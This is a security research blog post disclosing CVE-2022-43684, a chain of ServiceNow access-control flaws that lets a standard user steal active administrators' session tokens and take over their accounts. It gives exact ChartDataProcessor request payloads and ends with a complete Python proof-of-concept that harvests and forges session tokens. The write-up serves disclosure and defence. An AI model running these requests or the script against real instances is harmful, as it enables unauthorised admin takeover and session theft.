---
layout: post
title: ServiceNow Insecure Access Control To Full Admin Takeover
categories: [ServiceNow, Access Control, Admin Takeover]
description: Insecure Access Control
keywords: ServiceNow, Access Control
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---

# ServiceNow Insecure Access Control leading to Administrator Account Takeover - CVE-2022-43684

> This article was originally uploaded by Luke Symons on his [blog](https://x64.sh/posts/ServiceNow-Insecure-access-control-to-admin/#servicenow-insecure-access-control-leading-to-administrator-account-takeover---cve-2022-43684) as part of our joint research.

In this article, we will discuss a series of vulnerabilities that when exploited in succession, could enable a low-privilege user in ServiceNow to gain unauthorised full administrative access to the ServiceNow instance.

ServiceNow is a cloud-based platform that provides service management software as a service (SaaS). It is used by a millions of companies worldwide, and specialises in IT Service Management (ITSM), IT Operations Management (ITOM), and IT Business Management (ITBM). It allows users to manage incidents, service requests, problems, and changes within the IT infrastructure of a business. It also provides a self-service portal where end users can request IT services and log issues.

While working internally as a security engineer on the offensive security team, we routinely scrutinise the security of third-party platforms that integrate with our systems and processes. This is a crucial step to verify the security of these platforms and prevent potential breaches that could expose our sensitive data. During a recent engagement in mid-2022 our security team was able to exploit a number of vulnerabilities in ServiceNow leading to an effective account takeover to obtain administrative access on the platform as a low privileged user.

# Exploring the ServiceNow application
While exploring the ServiceNow application, we determined that the application uses `.do` pages. `.do` endpoints are often associated with Java servlets, which are used to process requests and return dynamic content. As these pages query server-side resources, it should be secured against unauthorized or unintended access to prevent users from gaining access to sensitive functionality.

ServiceNow also uses Xml Http Requests (XHR), which is a fundamental technology behind Asynchronous JavaScript and XML (AJAX). The use of these API calls are to allow the performance of various operations without needing a full refresh of the page, which can improve the usability and efficiency of the application. ServiceNow widely uses XHR requests to update records or interacting with certain server-side resources or 'processors'.

The application also uses the Glide Query Language (GQL), which is an proprietary, object-oriented language that forms the basis for the ServiceNow API to perform CRUD operations on its database. In essence, GQL serves as an abstraction layer for SQL operations that allows developers to perform database operations without interacting with raw SQL.

As a low privilege user, we discovered that it was not possible to directly access many of the application's functionalities. An example is shown below, where we attempted to view the $interactive_analysis.do page:

<a href="/images/blog/servicenow-1.png"><img src="/images/blog/servicenow-1.png"></a>

However, while navigating through the application, there are some locations that inadvertently redirect us to sensitive pages by appending query strings needed to create a valid request. Due to insufficient access control being implemented, we discovered that a standard user could access the $interactive_analysis.do endpoint if the query string was correctly formatted. We can send the following request to successfully access the `$interactive_analysis.do` page:

```
https://somehost.service-now.com/$interactive_analysis.do?sysparm_field=password&sysparm_table=sys_user&sysparm_from_list=true&sysparm_query=active%3Dtrue%5Ecaller_id%3Djavascript:gs.getUserID()&sysparm_list_view=&sysparm_tiny_url=f040a8971ba38150d88b624c274bcbb3
```

This is shown below:

<a href="/images/blog/servicenow-2.png"><img src="/images/blog/servicenow-2.png"></a>

This is a very interesting functionality, because at first glance it provides the low privilege user with a graphical representation of all the users that are within the application, which could potentially signal that potentially sensitive information is being retrieved through some database.

## Discovering the XHR request behind Interactive Analysis
Through further investigation, we determined that the `$interactive_analysis.do` page, as well as the corresponding `report_viewer.do` (by accessing the chart from a separate page), sends an XHR request to `xmlhttp.do` with the `ChartDataProcessor` processor in the POST request. The initial output is quite complex, however it is possible to decode/trim the request and simplify it to the following POST body:

```
sysparm_request_params={"page_num":"0","series":[{"table":"sys_user","groupby":"name","filter":"","plot_type":"horizontal_bar"}]}&sysparm_processor=ChartDataProcessor 
```

## Enumerating tables using Glide Query Language (GQL)
We identified that ServiceNow sent an XHR request to `xmlhttp.do` with the "ChartDataProcessor" processor in a GQL format. As previously mentioned, Glide Query Language is a language that is specifically used for ServiceNow, and the processors were scripts that run server-side that can be called through the XHR request. It is similar to SQL in the format structure sent in the POST request.

We identified that the following parameters are of interest:

  + `table`: The specific database table used by the application.
  + `groupby`: Retrieves the rows from the specified column. This only retrieves the first 10 values used for rendering the chart/graph, however we can modify the "page_num" to enumerate all the values.
  + `filter`: Filtering the results retrieved from the GQL query.

Leveraging this access control issue we enumerated a number of databases using Burp Suite Intruder and online documentation used by developers of ServiceNow third party plugins. This section of the test required a lot of trial and error to identify potentially useful tables, as there were hundreds of different tables containing varying degrees of sensitive data. We identified that the following tables were particularly interesting for a threat actor:

  + `sys_db_object`: Retrieves the complete list of tables used by the application.
  + `sys_user`: List of all users
  + `sys_emails`: List of all emails

According to the documentation, to be able to view ServiceNow tables we need to have read access to at least the ServiceNow tables `sys_db_object`, `sys_dictionary`, and `sys_glide_object`, and in addition to that to the tables you want to view, including referenced tables. However we were not allowed to access certain fields such as the `user_password` column in the `sys_user` table, as this would be an easy method to obtain privilege escalation against the system. Through further enumeration however, we were able to find two additional interesting tables, which will prove to be extremely useful later on:

  + `sys_user_session`: Retrieves the `glide_session_store` and `X-Usertoken` used by any account.
  + `sys_user_token`: Partially retrieves the `glide_user_activity` value.

## Constructing a valid session to escalate privileges to Administrator
When testing the application and enumerating the database using the GQL language, we also noted that a valid authenticated session requires the following cookies/headers:

  + First method: The `glide_user_activity` and `glide_session_store` cookies, and the `X-Usertoken` header to be correctly set, OR
  + Second method: The `JSESSIONID` cookie and the `X-Usertoken` header to be correctly set.

As it was possible to leak the tables we assumed that `sys_user_session` and `sys_user_token` would be all we needed to steal other accounts. While this was true there proved to be more nuance that made it more difficult to exploit.

The second method initially stood out since the knowledge of a `JSESSIONID` cookie and the `X-Usertoken` header would lead to an effective account takeover of any logged in administrator user. Ultimately, we were unable to obtain the `JSESSIONID` from any table, however it may be possible to leverage XSS/CSRF for a successful account takeover, but this was never attempted because we were able to retrieve a valid pathway to exploitation using the first method. The steps are outlined as follows:

Firstly, we can use the following query to retrieve the `glide_session_store`, which is used to store session information for users. Each record represents a unique session for each user, as well as other related information:

```
sysparm_request_params={"page_num":"0","series":[{"table":"sys_user_session","groupby":"id","filter":"nameCONTAINS[Insert_Admin_Email_Here]^invalidatedISNULL","plot_type":"horizontal_bar"}]}&sysparm_processor=ChartDataProcessor 
```

Note that the results are filtered by the name of the target user, which we can enumerate using the `sys_user` table - this can also help us determine who the administrators of the instance are. The `^invalidatedISNULL` removes all the invalidated or expired tokens.

Secondly, we need to retrieve the `X-Usertoken` value from the `sys_user_session` table, which is the CSRF token that the application provides users to ensure that requests made are genuine and not malicious. We require this token to make subsequent requests to the server.

```
sysparm_request_params={"page_num":"0","series":[{"table":"sys_user_session","groupby":"csrf_token","filter":"nameCONTAINS[Insert_Admin_Email_Here]^invalidatedISNULL","plot_type":"horizontal_bar"}]}&sysparm_processor=ChartDataProcessor
```

The most difficult aspect was to determine a valid `glide_user_activity` token. A standard `glide_user_activity` token looks like this:

```
U0N2M18xOmV4VFozT2Eyb2p0OVVWcXY5WktIeUl2L2h5MjFBMlY1d3RnRWkrUVpkZnM9Ok9NNzFIRDV1S0ZBMy90L1plMW5oQXk0OWliYVdBMXFlZUc5cmE3aGdPQ1E9
```

We can make the following request to retrieve the partial token from the database:

```
sysparm_request_params={"page_num":"0","series":[{"table":"sys_user_token","groupby":"token","filter":"nameCONTAINS[Insert_Admin_Email_Here]","plot_type":"horizontal_bar"}]}&sysparm_processor=ChartDataProcessor 
```

However the values that were retrieved from `sys_user_token` appeared as follows:

<a href="/images/blog/servicenow-3.png"><img src="/images/blog/servicenow-3.png"></a>

Each `glide_user_activity` token could be base64 decoded however, revealing that the value from `sys_user_token` was the first half of the token:

<a href="/images/blog/servicenow-4.png"><img src="/images/blog/servicenow-4.png"></a>

Through trial and error, we determined that the signature section of the token was not sufficiently validated when sent to the server, and it was possible to simply replace or remove the second half of the token to create a valid token.

With all three requirements satisfied, it was then possible to takeover any account including administrative accounts with an active session on the ServiceNow instance. ServiceNow also implements impersonation to allow admin to login into any user account for debugging purposes, we were able to use the admin account to impersonate a spefical user admin account and grant our account admin privileges on the ServiceNow instance.

# Ending Statement
Overall, we were able to leverage several vulnerabilities to escalate privileges from a standard user account to administrator of the ServiceNow instance. The following vulnerabilities allowed us to gain effective account takeover:

  + Insecure access control in the "ChartDataProcessor" processor
  + Overly permissive read access to sensitive tables in ServiceNow database
  + Insufficient signature validation of the `glide_user_activity` token

While the root cause of the issue was due to a insecure access control, the other vulnerabilties discovered and chained together took a medium impact bug to a critical impact bug with a CVSS score of `9.9 - https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&version=3.1`

# Credits
The multiple vulnerabilities leading to full compromise of the ServiceNow instance were discovered by Luke Symons, Tony Wu, Eldar Marcussen, Gareth Phillips, Jeff Thomas, Nadeem Salim, and Stephen Bradshaw.

# Proof of Concept
```python
import base64
import requests
import argparse
import requests
import bs4
import json
import urllib3
import argparse
import xml.etree.ElementTree as ET

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def banner():
    banner = '''

                ..ooo@@@XXX%%%xx..
            .oo@@XXX%x%xxx..     ` .
          .o@XX%%xx..               ` .
        o@X%..                  ..ooooooo
      .@X%x.                 ..o@@^^   ^^@@o
    .ooo@@@@@@ooo..      ..o@@^          @X%
    o@@^^^     ^^^@@@ooo.oo@@^             %
   xzI    -*--      ^^^o^^        --*-     %
   @@@o     ooooooo^@@^o^@X^@oooooo     .X%x
  I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x
  I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x
   @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x
    ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx
          o@@^^^ooo I^^ I^o ooo   .  x
          oo @^ IX      I   ^X  @^ oo
          IX     U  .        V     IX
           V     .           .     V  

   .-~*´¨¯¨`*·~-.,-(Account Now)-,.-~*´¨¯¨`*·~-. 
       Privilege Escalation by Rezk0n and WucciSec
       greets to Wireghoul, GmP, punk_fairybread, & d4rkt1d3 
      '''
    print(banner)

target = "https://<ServiceNow_Instance>:443/xmlhttp.do"
cookies = {"BIGipServerpool_<instancename>": "", "JSESSIONID": "", "__CJ_g_startTime": "%%22", "glide_mfa_remembered_browser": "", "glide_session_store": "", "glide_user_activity": "", "glide_user_route": ""}
headers = {"User-Agent": "", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close", "X-Usertoken": "", "Origin": "", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Referer": "", "Te": "trailers", "Content-Type": "application/x-www-form-urlencoded"}

def get_users(xrange):
    session = requests.session()
    post_data = '{"page_num":"%s","series":[{"table": "sys_user","groupby":"user_name",' \
                    '"filter":"","plot_type":"horizontal_bar"}]}' % (xrange)
    payload = {"sysparm_request_params": post_data, "sysparm_processor": "ChartDataProcessor"}
    json_response = session.post(target, headers=headers, cookies=cookies, data=payload,
                                     proxies=proxies, verify=False)
    tree = ET.fromstring(json_response.text)
    notags = ET.tostring(tree, encoding='utf8', method='text')
    json_data = json.loads(notags)
    a = json_data['CHART_DATA']
    b = json.loads(a)['series']
    for i in b:
        arr = i['aggregate_query']
        c = i['aggregate_query']
        print(c)
        if len(c) == 0:
            exit(1)

def retrieve_tokens(table, groupby, name, admin_filter):
    session = requests.session()
    if not admin_filter:
        post_data = '{"page_num":"0","series":[{"table": "%s","groupby":"%s",' \
                    '"filter":"nameCONTAINS%s","plot_type":"horizontal_bar"}]}' % (table, groupby, name)
    else:
        post_data = '{"page_num":"0","series":[{"table": "%s","groupby":"%s",' \
               '"filter":"nameCONTAINS%s^invalidatedISNULL","plot_type":"horizontal_bar"}]}' % (
                   table, groupby, name)
    payload = {
        "sysparm_request_params": post_data, "sysparm_processor": "ChartDataProcessor"}
    json_response = session.post(target, headers=headers, cookies=cookies, data=payload,
                                 proxies=proxies, verify=False)
    tree = ET.fromstring(json_response.text)
    notags = ET.tostring(tree, encoding='utf8', method='text')
    json_data = json.loads(notags)
    a = json_data['CHART_DATA']
    b = json.loads(a)['series']
    for i in b:
        arr = i['aggregate_query']
        c = i['aggregate_query'][0]
    if not admin_filter:
        base64_bytes_arr = []
        num = 0
        for val in arr:
            try:
                token = arr[num].strip('token=')
                token_format = "SCv3_1:{}=:{}".format(token, "AAAA")
                encoded_token = token_format.encode('ascii')
                base64_bytes = base64.b64encode(encoded_token)
                base64_bytes_arr.append(base64_bytes)
            except Exception as err:
                #print(err)
                print("No Active Session, we cant steal anything!! :(")
                exit(1)
            num = num + 1
        return base64_bytes_arr
    else:
        try:
            return arr
        except Exception as e:
            print("No Vaild Sessions")
            exit(1);

def validation(sess, user, activity):
    session = requests.session()
    validation_endpoint = "https://<ServiceNowInstance>/api/now/ui/impersonate/role"
    validation_cookies = {
        "glide_user_activity": activity,
        "glide_session_store": sess
    }
    validation_headers = {"X-Usertoken": user,
               "Origin": "https://<serviceNowInstance>", "Content-Type": "application/json;charset=utf-8"
    }
    payload = {"role":""}
    json_response = session.post(validation_endpoint, headers=validation_headers, cookies=validation_cookies, json=payload,
                                 proxies=proxies, verify=False)
    return json_response.status_code, json_response.json()

def main():
    glide_session_stores_arr = []
    usertoken_arr = []
    glide_user_activity_arr = []
    try:
        glide_session_stores_arr = retrieve_tokens('sys_user_session', 'id', args.n, True)
        usertoken_arr = retrieve_tokens('sys_user_session', 'csrf_token', args.n, True)
        glide_user_activity_arr = retrieve_tokens('sys_user_token', 'token', args.n, False)
    except Exception as e:
        print("No valid session with that user..:(\n")
        exit(1)

    print("Testing access to the /api/now/ui/impersonate/role endpoint")
    is_valid = False
    for glide_session_stores in glide_session_stores_arr:
        for usertoken in usertoken_arr:
            for glide_user_activity in glide_user_activity_arr:
                if is_valid:
                    break
                try:
                    session_token = glide_session_stores.strip("id=")
                    user_token = usertoken[11:]
                    activity_token = glide_user_activity.decode('ascii')

                    status_code, response = validation(session_token, user_token, activity_token)
                    if status_code == 201:
                        print("Success! Potential Administrator Credentials!")
                        print("\tglide_session_stores: " + str(session_token))
                        print("\tX-Usertoken: " + str(user_token))
                        print("\tglide_user_activity: " + str(activity_token))
                        print("\n")
                        active_roles = response['result']['activeRoles']
                        print("\tActive Roles: " + str(active_roles))
                        is_valid = True
                    else:
                        print(".",)
                except Exception as e:
                    print(e)

if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('-n', type=str, required=False, help="Provide a user account to takeover.")
    parser.add_argument('-d', '--dump', action='store_true')
    args = parser.parse_args()
    if args.dump:
        for i in range(1, 10):
            get_users(xrange=i)
    if args.n:
        main()
```